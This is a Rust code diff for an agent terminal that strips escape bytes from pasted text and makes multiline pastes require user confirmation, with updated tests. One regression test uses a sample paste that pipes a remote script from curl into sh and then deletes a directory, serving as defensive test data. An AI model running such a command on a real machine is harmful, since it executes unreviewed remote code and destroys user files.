@@ -333,16 +333,16 @@ impl AgentTerminal {
         // \r for Enter; without this, \n bytes pass through raw-mode PTYs
         // unchanged, breaking multi-line paste in programs like tmux and vi.
         let text = text.replace("\r\n", "\r").replace('\n', "\r");
-        let bracketed = self.term.mode().contains(TermMode::BRACKETED_PASTE);
-        if bracketed {
-            // Strip ESC bytes so pasted content cannot inject escape sequences
-            // that would break out of the bracketed paste or confuse the shell.
-            let sanitized = text.replace('\x1b', "");
+        // 剥掉 ESC：粘贴内容不该能注入转义序列。bracketed 模式下它能逃出
+        // bracketed paste 区间，非 bracketed 模式下它同样能让 shell 误解析——
+        // 原来只有 bracketed 分支剥，非 bracketed 分支是裸写的。
+        let sanitized = text.replace('\x1b', "");
+        if self.term.mode().contains(TermMode::BRACKETED_PASTE) {
             self.write_bytes(b"\x1b[200~");
             self.write_text_input(&sanitized);
             self.write_bytes(b"\x1b[201~");
         } else {
-            self.write_text_input(&text);
+            self.write_text_input(&sanitized);
         }
     }
 
@@ -1514,12 +1514,19 @@ fn bytes_to_hex(bytes: &[u8]) -> String {
     out
 }
 
+/// 判断这次粘贴是否需要用户确认。
+///
+/// 之前三个条件是**与**关系：≥4 行 **且** ≥120 字符 **且** 非 ASCII 占比 ≥35%。
+/// 于是最典型的危险粘贴——纯 ASCII 的多行 `curl … | sh`——一条都不满足，
+/// 完全不触发确认。而 `write_paste_input` 会把 `\n` 全转成 `\r`，等于逐行回车执行。
+/// 非 ASCII 占比高本来是用来抓"看不出内容的伪装文本"的，它不该是危险的**前提**。
+///
+/// 现在拆成两个独立触发条件：
+/// - 多行（会被逐行执行），或
+/// - 体量大且非 ASCII 占比高（内容不可目视核对）
 fn evaluate_paste_risk(text: &str) -> Option<PasteRisk> {
     let line_count = text.lines().count().max(1);
     let char_count = text.chars().count();
-    if line_count < PASTE_GUARD_MIN_LINES || char_count < PASTE_GUARD_MIN_CHARS {
-        return None;
-    }
 
     let mut visible_chars = 0usize;
     let mut non_ascii_chars = 0usize;
@@ -1538,7 +1545,12 @@ fn evaluate_paste_risk(text: &str) -> Option<PasteRisk> {
     }
 
     let non_ascii_ratio = non_ascii_chars as f32 / visible_chars as f32;
-    if non_ascii_ratio < PASTE_GUARD_NON_ASCII_RATIO {
+
+    let multiline_execution_risk = line_count >= PASTE_GUARD_MIN_LINES;
+    let opaque_bulk_risk =
+        char_count >= PASTE_GUARD_MIN_CHARS && non_ascii_ratio >= PASTE_GUARD_NON_ASCII_RATIO;
+
+    if !multiline_execution_risk && !opaque_bulk_risk {
         return None;
     }
 
@@ -1925,19 +1937,37 @@ mod tests {
     use crate::terminal::{ScreenSnapshot, SelectionPoint};
     use alacritty_terminal::term::TermMode;
 
+    /// 回归（SEC-7）：三个条件原本是**与**关系，于是最典型的危险粘贴——纯 ASCII 的
+    /// 多行 `curl … | sh`——一条都不满足，完全不触发确认。而粘贴会把 \n 全转成 \r，
+    /// 等于逐行回车执行。
     #[test]
-    fn paste_risk_requires_multiline_and_non_ascii_heavy_content() {
-        let safe = "line1\nline2\nline3\nline4";
-        assert!(evaluate_paste_risk(safe).is_none());
+    fn paste_risk_triggers_on_plain_ascii_multiline_scripts() {
+        let curl_pipe_sh =
+            "#!/bin/sh\ncurl -fsSL http://example.com/i.sh | sh\nrm -rf ~/tmp\necho done\n";
+        let risk = evaluate_paste_risk(curl_pipe_sh).expect("multiline paste must be confirmed");
+        assert_eq!(risk.line_count, 4);
 
-        let risky = "中文内容一二三四五六七八九十中文内容一二三四五六七八九十\n第二行中文内容一二三四五六七八九十中文内容一二三四五六七八九十\n第三行中文内容一二三四五六七八九十中文内容一二三四五六七八九十\n第四行中文内容一二三四五六七八九十中文内容一二三四五六七八九十\n";
-        assert!(evaluate_paste_risk(risky).is_some());
+        // 多行本身就是触发条件，不再要求非 ASCII 占比。
+        let plain = "line1\nline2\nline3\nline4";
+        assert!(evaluate_paste_risk(plain).is_some());
     }
 
     #[test]
-    fn paste_risk_ignores_short_text_even_if_non_ascii() {
-        let short = "你好\n你好\n你好\n你好\n";
-        assert!(evaluate_paste_risk(short).is_none());
+    fn paste_risk_ignores_short_single_line_pastes() {
+        // 单行不会被逐行执行，体量也不大——最常见的正常粘贴，不该打扰用户。
+        assert!(evaluate_paste_risk("git status").is_none());
+        assert!(evaluate_paste_risk("你好世界").is_none());
+        assert!(evaluate_paste_risk("line1\nline2").is_none());
+        assert!(evaluate_paste_risk("").is_none());
+    }
+
+    /// 另一条独立触发条件：体量大且非 ASCII 占比高，内容无法目视核对。
+    #[test]
+    fn paste_risk_triggers_on_bulky_opaque_single_line_text() {
+        let opaque: String = std::iter::repeat_n('中', 200).collect();
+        let risk = evaluate_paste_risk(&opaque).expect("bulky non-ascii paste must be confirmed");
+        assert_eq!(risk.line_count, 1);
+        assert!(risk.non_ascii_ratio > 0.9);
     }
 
     #[test]
